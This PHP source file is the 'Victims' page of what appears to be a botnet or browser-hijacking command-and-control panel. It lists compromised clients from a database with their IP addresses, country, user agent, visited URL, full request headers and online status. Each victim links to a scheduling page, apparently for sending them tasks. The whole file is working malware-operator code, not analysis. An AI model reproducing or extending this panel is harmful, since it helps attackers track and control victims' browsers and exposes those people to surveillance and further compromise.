<?php
include('login.php');
define('allowed',true);
include('../db.php');
include('header.php');
?>
    <div class="content">
        <p>
            <h1>Victims</h1>
        </p>
        <table>
            <tr>
                <th>User ID (<a href="#" ctitle="Identify a user in a site" class="tooltip">?</a>)</th>
                <th>IP Address</th>
                <th>Country</th>
                <th>User Agent</th>
                <th>URL</th>
                <th>Headers</th>
                <th>Registration Date</th>
                <th>Last Update</th>
                <th>Status</th>
            </tr>
            <?php
            $condition = "WHERE status=1 "; if ($_GET['o'] == "all") $condition = "";
            if ($res = $mysqli->query("SELECT * FROM users ".$condition."ORDER BY lastonline DESC;")) {
                $res->data_seek(0);
                while ($row = $res->fetch_assoc()) {
                ?>
                <tr>
                    <td><a href="schedules.php?uid=<?php echo $row['id']; ?>"><?php echo $row['id']; ?></a></td>
                    <td><?php echo $row['ip']; ?></td>
                    <td><img width="25" height="15" src="<?php echo "http://api.hostip.info/flag.php?ip=".$row['ip']; ?>" /></td>
                    <td><?php echo $row['ua']; ?></td>
                    <td><?php echo $row['url']; ?></td>
                    <td><input type="button" value="Show/Hide" onclick="showhide('div<?php echo $row['id']; ?>')" /><div id="div<?php echo $row['id']; ?>" style="display:none"><pre><?php echo $row['headers']; ?></pre></div></td>
                    <td><?php echo $row['regdate']; ?></td>
                    <td><?php echo $row['lastupdate']; ?></td>
                    <td style="text-align:center">
                        <svg xmlns="http://www.w3.org/2000/svg" style="width:10px;height:10px;">
                            <circle cx="5" cy="5" r="5" stroke="black" stroke-width="1" fill="
                            <?php
                            if($row['status']) {
                                $inactive_time = time() - strtotime($row['lastonline']);
                                if ($inactive_time > 5*3600) //After 5 hours a client become inactive
                                   echo "#FF8000\"><title>Inactive. Last time online: ".$row['lastonline']."</title";
                                else
                                    echo "#00BB00\"><title>Online since ".$row['lastonline']."</title";
                            } else
                                echo "#555555\"><title>Offline. Last time online: ".$row['lastonline']."</title";
                            ?>"> </circle>
                        </svg>
                    </td>
                </tr>
                <?php
                }
                $res->close();
            }
            ?>
        </table>
        <p>
            <input type="button" value="Show all victims" onclick="document.location.href='?o=all'" />
        </p>
   </div>
<script>
function showhide(id)
{
    var div = document.getElementById(id);
    if (div.style.display != "none")
        div.style.display = "none";
    else
        div.style.display = "block";
}
</script>
</body>
</html>
<?php
$mysqli->close();
?>
